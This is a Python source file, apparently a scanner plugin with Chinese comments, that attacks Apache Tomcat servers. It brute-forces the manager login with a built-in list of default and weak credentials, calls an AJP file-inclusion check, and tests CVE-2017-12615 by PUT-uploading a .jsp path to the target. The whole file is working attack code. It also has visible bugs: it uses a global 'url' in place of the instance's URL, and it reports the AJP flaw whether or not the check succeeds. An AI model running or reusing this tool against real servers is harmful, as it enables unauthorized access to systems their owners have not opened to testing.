import requests
from termcolor import cprint
from queue import Queue
from threading import Thread
import base64
from tqdm import *
from colorama import Fore

# 全都用tqdm.write(url)打印     能够打印在进度条上方，并将进度条下移一行。
# 存在漏洞可能得需要红色，使用   tqdm.write(Fore.RED + url)   打印则有颜色
# 打印一些错误需要灰色 使用   tqdm.write(Fore.WHITE + url)
# 打印漏洞结果 使用   tqdm.write(Fore.BLACK + url)


class Detect:
    name = 'Tomcat'

    def __init__(self, url, vul_list, requests_proxies):
        self.url = url
        self.vul_list = vul_list                    # 存储漏洞的名字和url
        self.proxies = requests_proxies  # 代理
        self.user_L = ['tomcat', 'root', 'admin', 'test', 'manager']
        self.pwd_L = ['tomcat', 'root', 'admin', 'test', 'manager', '', '123456', '{user}123', '{user}2019', '{user}2020', 'P@ssw0rd',
                      'Passw0rd', '1234qwert', 'admin888', 'password', '1qaz2wsx']

        self.user_pwd_q = self.get_user_pwd_q()
        self.isExist = False  # 检测该url是否存在漏洞，默认为False，如果测出有漏洞，则设置为True
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0'}

    # 将账号密码放入队列里
    def get_user_pwd_q(self):
        user_pwd_q = Queue(-1)
        for user in self.user_L:
            for pwd in self.pwd_L:
                user_pwd_q.put('{}:{}'.format(user, pwd.format(user=user)))
        return user_pwd_q

    def run_detect(self):
        # 弱口令
        self.weakPwd()

        # 文件包含
        self.AJP_LFI()

        # put上传
        self.CVE_2017_12615()

        if not self.isExist:
            return False
        else:
            return True

    # 弱口令
    def weakPwd(self):
        tqdm.write(Fore.WHITE + '[check tomcat vul] {}'.format(self.url))
        self.weakPwd_url = url + '/manager/html'
        try:
            res = requests.get(url=self.weakPwd_url, headers=self.headers, proxies=self.proxies, timeout=10)
            if res.status_code == 401:
                tqdm.write(Fore.WHITE + '[check tomcat weak password] {}'.format(self.weakPwd_url))
            else:
                tqdm.write(Fore.WHITE + '[tomcat {} not 401]'.format(self.weakPwd_url))
                return False
        except Exception as e:
            return False

        while not self.user_pwd_q.empty():
            user_pwd = self.user_pwd_q.get()
            user_pwd_base64 = base64.b64encode(user_pwd.encode()).decode()
            print(user_pwd_base64)
            self.headers['Authorization'] = 'Basic {}'.format(user_pwd_base64)
            try:
                res = requests.get(url=self.weakPwd_url, headers=self.headers, proxies=self.proxies, timeout=10)
                tqdm.write(Fore.WHITE + '[~] IP:{} code:{} user_pwd:{}'.format(self.weakPwd_url, res.status_code, user_pwd))
                if res.status_code == 200:                                  # 状态码200说明成功爆破出账号密码
                    self.true_user_pwd_base64 = user_pwd_base64     # 正确的账号密码
                    tqdm.write(Fore.RED + u'[+] IP:{} code:{} user_pwd:{}'.format(self.weakPwd_url, res.status_code, user_pwd))
                    self.vul_list.append(['Tomcat', '{} {}'.format(self.weakPwd_url, user_pwd), 'YES'])
                    self.isExist = True
            except Exception as e:
                tqdm.write(Fore.WHITE + u'[~] IP:{} timeout.'.format(self.weakPwd_url))

    # 文件包含
    def AJP_LFI(self):
        tqdm.write(Fore.WHITE + '[check tomcat AJP_LFI] {}'.format(self.url))
        from Plugins.Vul.CMS.Tomcat_AJP_LFI import detect_AJP_LFI
        try:
            self.isExist = detect_AJP_LFI(self.url)
            tqdm.write(Fore.RED + '[Tomcat AJP_LFI] {}'.format(url))
            self.vul_list.append(['Tomcat', '{} AJP LFI'.format(self.url), 'YES'])
        except Exception as e:
            pass

    # put上传
    def CVE_2017_12615(self):
        url1 = self.url + '/111111111111.jsp/'
        url2 = self.url + '/111111111111.jsp'
        tqdm.write(Fore.WHITE + 'check put upload : {}'.format(url1))
        try:
            res = requests.put(url=url1, headers=self.headers, proxies=self.proxies, verify=False, data='111111111111111')
            res2 = requests.get(url=url2, headers=self.headers, proxies=self.proxies, verify=False)
            if res2.text == '111111111111111':
                self.isExist = True
                tqdm.write(Fore.RED + '[Tomcat CVE-2017-12615] {}'.format(url))
                self.vul_list.append(['Tomcat CVE-2017-12615', self.url, 'Yes {}'.format(url2)])
        except Exception as e:
            return False

if __name__ == '__main__':
    from queue import Queue

    vul_list = []
    # proxy = r'192.168.168.148:10086'
    # requests_proxies = {"http": "socks5://{}".format(proxy), "https": "socks5://{}".format(proxy)}
    requests_proxies = None
    url = r'http://www.domain.com'
    Detect(url, vul_list, requests_proxies).run_detect()

    tqdm.write(Fore.BLACK + '-' * 50 + '结果' + '-' * 50)
    for vul in vul_list:
        tqdm.write(Fore.BLACK + str(vul))
